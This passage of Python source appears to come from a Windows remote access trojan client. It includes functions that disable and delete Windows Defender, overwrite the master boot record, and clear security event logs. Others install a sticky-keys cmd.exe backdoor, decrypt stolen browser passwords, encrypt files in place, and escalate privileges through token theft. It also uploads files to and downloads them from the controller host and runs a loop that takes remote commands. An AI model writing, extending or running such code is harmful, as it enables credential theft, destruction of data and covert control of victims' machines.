                r'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f',
                r'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f',
                r'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f']
            result = ''
            for cmd in cmd_list:
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
            return 1, result
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def killwd_service():
        try:
            cmd_list = [
                r'sc sdset WinDefend O:SYG:SYD:AI(A;CIID;KR;;;BU)(A;CIID;KA;;;BA)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;CO)(A;CIID;KR;;;AC)(A;CIID;KR;;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)',
                r'sc stop WinDefend',
                r'sc delete WinDefend']
            result = ''
            for cmd in cmd_list:
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
            return 1, result
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def killmbr():
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                handle_device = win32file.CreateFileW('\\\\.\\PhysicalDrive0', win32con.GENERIC_WRITE,
                                                      win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE, None,
                                                      win32con.OPEN_EXISTING, 0, 0)
                win32file.WriteFile(handle_device, win32file.AllocateReadBuffer(512), None)
                win32file.CloseHandle(handle_device)
                return 1, '[+] Success'
            else:
                return 0, '[-] Operation requires elevation'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def clearlog():
        try:
            cmd_list = [r'wevtutil cl System',
                        r'wevtutil cl Security',
                        r'wevtutil cl Application']
            result = ''
            for cmd in cmd_list:
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
            return 1, result
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def cleanup(client):
        try:
            cmd_list = [
                r'del "{}" /f'.format(os.path.join(
                    os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup',
                    os.path.basename(EXECUTABLE_PATH))),
                r'reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "{}" /f'.format(
                    PROG_NAME),
                r'schtasks.exe /delete /tn {} /f'.format(PROG_NAME),
                r'sc stop {}'.format(PROG_NAME),
                r'sc delete {}'.format(PROG_NAME)
            ]
            result = ''
            for cmd in cmd_list:
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
            if not getattr(sys, 'frozen', False):
                client.send_text(1, result)
                return
            with open(TEMP_DIR + r'\cleanup.bat', 'w') as f:
                f.write(
                    f'@echo off\n:loop\ntimeout /t 2 /nobreak >nul\ndel /f "{EXECUTABLE_PATH}"\nif exist "{EXECUTABLE_PATH}" goto loop\ndel /f %~f0')
            client.send_text(1, result)
            Command.hiderun(TEMP_DIR + r'\cleanup.bat')
            Command.pkill(os.path.basename(EXECUTABLE_PATH))
        except Exception as exception:
            client.send_text(0, '[-] Error: {}'.format(exception))

    @staticmethod
    def webul(client, args):
        try:
            status, result = Helper.parse_arguments({'url': False, 'filename': True}, args)
            if not status:
                client.send_text(0, '[-] Error: {}'.format(result))
                return
            url = result['url'] if result['url'] else f'http://{client.host}:8888/upload'
            filename = result['filename']
            if os.path.isfile(filename):
                with open(filename, 'rb') as f:
                    response = requests.post(url, files={'file': f})
                    client.send_text(1, response.text)
            else:
                client.send_text(0, '[-] File not found')
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))

    @staticmethod
    def webdl(client, args):
        try:
            status, result = Helper.parse_arguments({'url': False, 'filename': True}, args)
            if not status:
                client.send_text(0, '[-] Error: {}'.format(result))
                return
            filename = result['filename']
            url = result['url'] if result['url'] else f'http://{client.host}:8888/uploads/{filename}'
            response = requests.get(url)
            if response.status_code == 200:
                with open(filename, 'wb') as f:
                    f.write(response.content)
                client.send_text(1, '[+] File downloaded successfully')
            else:
                client.send_text(0, '[-] ' + str(response.status_code))
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))

    @staticmethod
    def replace_files():
        try:
            sys_dir = r'C:\Windows\System32'
            if os.path.isfile(sys_dir + r'\sethc.exe.bak'):
                return '[-] File already exists'
            cmd_list = [r'takeown /f %s\sethc.exe' % sys_dir,
                        r'icacls %s\sethc.exe /grant administrators:F' % sys_dir,
                        r'move {0}\sethc.exe {0}\sethc.exe.bak'.format(sys_dir),
                        r'copy {0}\cmd.exe {0}\sethc.exe'.format(sys_dir)]
            result = ''
            for cmd in cmd_list:
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
            return 1, result
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def enable_wer():
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\Windows Error Reporting', 0,
                                 winreg.KEY_WRITE)
            winreg.SetValueEx(key, 'DontShowUI', 0, winreg.REG_SZ, '0')
            winreg.CloseKey(key)
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def wer(path=None, process=None):
        try:
            if process:
                process = psutil.Process(process)
                path = process.exe()
                process.kill()
            threading.Thread(target=wer.report_error, args=(path,), daemon=True).start()
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)


class Helper:
    browser_dict = {'chrome': r'\Google\Chrome', 'edge': r'\Microsoft\Edge'}

    @staticmethod
    def enable_privilege(privilege):
        privilege_id = win32security.LookupPrivilegeValue(None, privilege)
        new_privilege = [(privilege_id, win32con.SE_PRIVILEGE_ENABLED)]
        handle_token = win32security.OpenProcessToken(win32process.GetCurrentProcess(), win32security.TOKEN_ALL_ACCESS)
        if handle_token:
            win32security.AdjustTokenPrivileges(handle_token, 0, new_privilege)

    @staticmethod
    def start_service(service):
        handle_scm = win32service.OpenSCManager(None, None, win32service.SC_MANAGER_ALL_ACCESS)
        handle_service = win32service.OpenService(handle_scm, service,
                                                  win32service.SERVICE_START | win32service.SERVICE_QUERY_STATUS)
        status = win32service.QueryServiceStatus(handle_service)[1]
        if status == win32service.SERVICE_STOPPED:
            win32service.StartService(handle_service, None)
        win32service.CloseServiceHandle(handle_service)

    @staticmethod
    def get_pid(process):
        for proc in psutil.process_iter():
            if process in proc.name():
                return proc.pid

    @staticmethod
    def get_elevation_type(pid):
        handle_process = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
        handle_token = win32security.OpenProcessToken(handle_process, win32con.TOKEN_QUERY)
        return win32security.GetTokenInformation(handle_token, ntsecuritycon.TokenElevationType)

    @staticmethod
    def get_elevated_process():
        for proc in psutil.process_iter():
            with contextlib.suppress(Exception):
                pid = proc.pid
                if Helper.get_elevation_type(pid) == win32security.TokenElevationTypeFull:
                    return pid

    @staticmethod
    def get_process_token(pid):
        handle_process = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
        return win32security.OpenProcessToken(handle_process, win32con.TOKEN_DUPLICATE | win32con.TOKEN_QUERY)

    @staticmethod
    def get_user_token():
        console_session_id = win32ts.WTSGetActiveConsoleSessionId()
        return win32ts.WTSQueryUserToken(console_session_id)

    @staticmethod
    def duplicate_token(handle_token):
        return win32security.DuplicateTokenEx(handle_token, 3, win32con.MAXIMUM_ALLOWED,
                                              win32security.TokenPrimary,
                                              win32security.SECURITY_ATTRIBUTES())

    @staticmethod
    def get_linked_token(handle_token):
        return win32security.GetTokenInformation(handle_token, ntsecuritycon.TokenLinkedToken)

    @staticmethod
    def create_process_with_token(handle_token):
        si = runpe.STARTUPINFO()
        pi = runpe.PROCESS_INFORMATION()
        si.cb = ctypes.sizeof(si)
        si.lpDesktop = 'winsta0\\default'
        creation_flags = win32con.CREATE_NEW_CONSOLE | win32con.NORMAL_PRIORITY_CLASS | win32con.CREATE_UNICODE_ENVIRONMENT
        ctypes.windll.advapi32.CreateProcessWithTokenW(int(handle_token), 1, EXECUTABLE_PATH, None,
                                                       creation_flags,
                                                       None, None, ctypes.byref(si), ctypes.byref(pi))

    @staticmethod
    def create_process_as_user(handle_token):
        creation_flags = win32con.CREATE_NEW_CONSOLE | win32con.NORMAL_PRIORITY_CLASS | win32con.CREATE_UNICODE_ENVIRONMENT
        environment = win32profile.CreateEnvironmentBlock(handle_token, False)
        win32process.CreateProcessAsUser(handle_token, EXECUTABLE_PATH, None, None, None, False,
                                         creation_flags, environment, None, win32process.STARTUPINFO())

    @staticmethod
    def get_master_key(filename):
        with open(filename, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
            master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
            return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

    @staticmethod
    def decrypt_password(master_key, buf):
        try:
            cipher = AES.new(master_key, AES.MODE_GCM, buf[3:15])
            password = cipher.decrypt(buf[15:])
            return password[:-16].decode()
        except:
            return None

    @staticmethod
    def get_passwords(master_key, db):
        db_copy = TEMP_DIR + r'\passwords'
        shutil.copy2(db, db_copy)
        conn = sqlite3.connect(db_copy)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        passwords = []
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            password = Helper.decrypt_password(master_key, r[2])
            if username and password:
                passwords.append({'url': url, 'username': username, 'password': password})
        cursor.close()
        conn.close()
        if os.path.isfile(db_copy):
            os.remove(db_copy)
        return passwords

    @staticmethod
    def traverse_bookmarks(items):
        bookmarks = []
        for item in items['children']:
            if item['type'] == 'folder':
                bookmarks.append(Helper.traverse_bookmarks(item))
            else:
                bookmarks.append({'name:': item['name'], 'url': item['url']})
        return {items['name']: bookmarks}

    @staticmethod
    def get_bookmarks(filename):
        with open(filename, encoding='utf-8') as f:
            data = json.load(f)
            bookmark_bar = data['roots']['bookmark_bar']
            other = data['roots']['other']
            return json.dumps([Helper.traverse_bookmarks(bookmark_bar), Helper.traverse_bookmarks(other)], indent=4,
                              ensure_ascii=False)

    @staticmethod
    def get_history(db):
        db_copy = TEMP_DIR + r'\history'
        shutil.copy2(db, db_copy)
        conn = sqlite3.connect(db_copy)
        cursor = conn.cursor()
        cursor.execute('SELECT url, title FROM urls')
        history = []
        for r in cursor.fetchall():
            history.append({'title': r[1], 'url': r[0]})
        cursor.close()
        conn.close()
        if os.path.isfile(db_copy):
            os.remove(db_copy)
        return history

    @staticmethod
    def enum_uninstall_key(reg, flag):
        software_list = []
        key = winreg.OpenKey(reg, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 0, winreg.KEY_READ | flag)
        for i in range(winreg.QueryInfoKey(key)[0]):
            software = []
            try:
                subkey = winreg.OpenKey(key, winreg.EnumKey(key, i))
                software.append(winreg.QueryValueEx(subkey, 'DisplayName')[0])
                try:
                    software.append(winreg.QueryValueEx(subkey, 'DisplayVersion')[0])
                except EnvironmentError:
                    software.append(None)
                try:
                    software.append(winreg.QueryValueEx(subkey, 'Publisher')[0])
                except EnvironmentError:
                    software.append(None)
                software_list.append(software)
            except EnvironmentError:
                continue
        return software_list

    @staticmethod
    def get_integrity_level():
        intgty_lvl = {
            0x0000: 'Untrusted',
            0x1000: 'Low',
            0x2000: 'Medium',
            0x2100: 'Medium high',
            0x3000: 'High',
            0x4000: 'System',
            0x5000: 'Protected process',
        }
        handle_token = win32security.OpenProcessToken(win32process.GetCurrentProcess(), win32security.TOKEN_READ)
        sid = win32security.GetTokenInformation(handle_token, ntsecuritycon.TokenIntegrityLevel)[0]
        return intgty_lvl.get(sid.GetSubAuthority(sid.GetSubAuthorityCount() - 1))

    @staticmethod
    def get_uac_level():
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 0,
                             winreg.KEY_READ)
        i, ConsentPromptBehaviorAdmin, EnableLUA, PromptOnSecureDesktop = 0, None, None, None
        while True:
            try:
                name, data, type = winreg.EnumValue(key, i)
                if name == 'ConsentPromptBehaviorAdmin':
                    ConsentPromptBehaviorAdmin = data
                elif name == 'EnableLUA':
                    EnableLUA = data
                elif name == 'PromptOnSecureDesktop':
                    PromptOnSecureDesktop = data
                i += 1
            except WindowsError:
                break
        if ConsentPromptBehaviorAdmin == 2 and EnableLUA == 1 and PromptOnSecureDesktop == 1:
            return '3/3 (Maximum)'
        elif ConsentPromptBehaviorAdmin == 5 and EnableLUA == 1 and PromptOnSecureDesktop == 1:
            return '2/3 (Default)'
        elif ConsentPromptBehaviorAdmin == 5 and EnableLUA == 1 and PromptOnSecureDesktop == 0:
            return '1/3'
        elif (ConsentPromptBehaviorAdmin == 0 and EnableLUA == 1 and PromptOnSecureDesktop == 0) or EnableLUA == 0:
            return '0/3 (Disabled)'
        else:
            return None

    @staticmethod
    def get_mtime(filename):
        return datetime.datetime.utcfromtimestamp(os.stat(filename).st_mtime).strftime('%Y-%m-%d %H:%M')

    @staticmethod
    def get_readable_size(bytes, suffix='B'):
        factor = 1024
        for unit in ['', 'K', 'M', 'G', 'T', 'P']:
            if bytes < factor:
                return f'{bytes:.2f} {unit}{suffix}'
            bytes /= factor

    @staticmethod
    def parse_arguments(arg_dict, arg):
        parser = ArgumentParser()
        for key in arg_dict:
            parser.add_argument('--{}'.format(key), type=str, nargs='*', required=arg_dict[key])
        d = vars(parser.parse_args(arg.split()))
        if parser.error_message:
            return 0, parser.error_message
        for k in d:
            d[k] = ' '.join(d[k]) if d[k] else None
        return 1, d

    @staticmethod
    def encrypt_file(filename, key, buffer_size=65536):
        input_file = open(filename, 'rb')
        output_file = open(filename + '.encrypted', 'wb')
        cipher = AES.new(key, AES.MODE_CFB)
        output_file.write(cipher.iv)
        buffer = input_file.read(buffer_size)
        while len(buffer) > 0:
            bytes = cipher.encrypt(buffer)
            output_file.write(bytes)
            buffer = input_file.read(buffer_size)
        input_file.close()
        output_file.close()
        os.remove(filename)
        os.rename(filename + '.encrypted', filename)

    @staticmethod
    def decrypt_file(filename, key, buffer_size=65536):
        input_file = open(filename, 'rb')
        output_file = open(filename + '.decrypted', 'wb')
        iv = input_file.read(16)
        cipher = AES.new(key, AES.MODE_CFB, iv=iv)
        buffer = input_file.read(buffer_size)
        while len(buffer) > 0:
            bytes = cipher.decrypt(buffer)
            output_file.write(bytes)
            buffer = input_file.read(buffer_size)
        input_file.close()
        output_file.close()
        os.remove(filename)
        os.rename(filename + '.decrypted', filename)

    @staticmethod
    def remove_privilege(handle_token, privilege):
        privilege_id = win32security.LookupPrivilegeValue(None, privilege)
        new_privilege = [(privilege_id, 4)]
        win32security.AdjustTokenPrivileges(handle_token, 0, new_privilege)


class ArgumentParser(argparse.ArgumentParser):
    def __init__(self, *args, **kwargs):
        super(ArgumentParser, self).__init__(*args, **kwargs)
        self.error_message = ''

    def error(self, message: str):
        self.error_message = message

    def parse_args(self, *args, **kwargs):
        result = None
        try:
            result = super(ArgumentParser, self).parse_args(*args, **kwargs)
        except SystemExit:
            pass
        return result


while True:
    client = Client()
    client.connect()
    while True:
        try:
            client.recv_commands()
        except socket.error as e:
            if client.logging:
                logger.error(e)
            print(e)
            client.socket.close()
            client.socket = socket.socket()
            break
        except Exception as ex:
            if client.logging:
                logger.error(ex)
            print(ex)
            continue
